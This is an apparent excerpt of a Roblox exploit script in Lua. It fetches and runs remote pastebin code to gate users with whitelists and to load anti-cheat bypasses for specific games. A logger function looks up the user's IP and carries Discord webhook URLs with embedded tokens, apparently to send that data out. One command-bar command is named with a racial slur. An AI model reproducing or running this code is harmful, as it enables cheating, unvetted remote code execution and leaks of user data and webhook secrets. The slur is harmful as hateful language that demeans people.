...
function NOTWHITELISTEDLOGGER()
	...
	local website = 'http://worldtimeapi.org/api/ip/'..ip
	...
	local discordWebhook = "https://discordapp.com/api/webhooks/768137978265468998/T97rKkT_2jKvWCTiw3vgzbdRnGIm6c_GKVs69kWVIh4Cv8kITjArTSOHS_E3RwzL4641"
...
loadstring(game:HttpGet(('https://pastebin.com/raw/0ArxE6t7'),true))() -- HWID AKA hashes XDXDxd
loadstring(game:HttpGet(('https://pastebin.com/raw/1dzYsC8V'),true))() -- USERNAMES
loadstring(game:HttpGet(('https://pastebin.com/raw/qNxyNps9'),true))() -- IDS
loadstring(game:HttpGet(('https://pastebin.com/raw/9JYg5Yn6'),true))() -- timezone
...
local source_Names = game:HttpGet('https://pastebin.com/raw/1dzYsC8V') --- USERNAMES
local source_Ids =   game:HttpGet('https://pastebin.com/raw/qNxyNps9') --- IDS
local source_zone =  game:HttpGet('https://pastebin.com/raw/9JYg5Yn6') --- TIME ZONES
                ...
                if timezone[game.Players.LocalPlayer.Name] and timezone[game.Players.LocalPlayer.Name] == zone or true then
                    if y(hashes, l) or true then
                        ...
                        --[[local response = syn.request(
                            {
                                Url = 'https://discordapp.com/api/webhooks/766049800960737311/zQtv4GbzKqvbQm_U1zvWg5yAejnJdOXcQuRVzzwQlsrRmIk-RFaUPkhJUnkvAb7fZr84',
                                Method = 'POST',
                                Headers = {
...
if game.PlaceId == 4669040 then
    loadstring(game:HttpGet('https://pastebin.com/raw/yThk7Axd'))() --- PRISON BYPASS
elseif game.PlaceId == 455366377 then
    loadstring(game:HttpGet('https://pastebin.com/raw/ZHR9ZjYY'))() --- THE STREETS BYPASS
 end
...
CmdBarMain.FocusLost:Connect(function(enterPressed)
    ...
    if enterPressed  then
        ...
        elseif CmdBarMain.Text == 'lowgfx' then
          ...
          elseif CmdBarMain.Text == "nigga destroyer" then
              for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                  if v.Name == 'Punch' then
                      if v:FindFirstChild('Handle') then
                          v.Handle.Massless = true
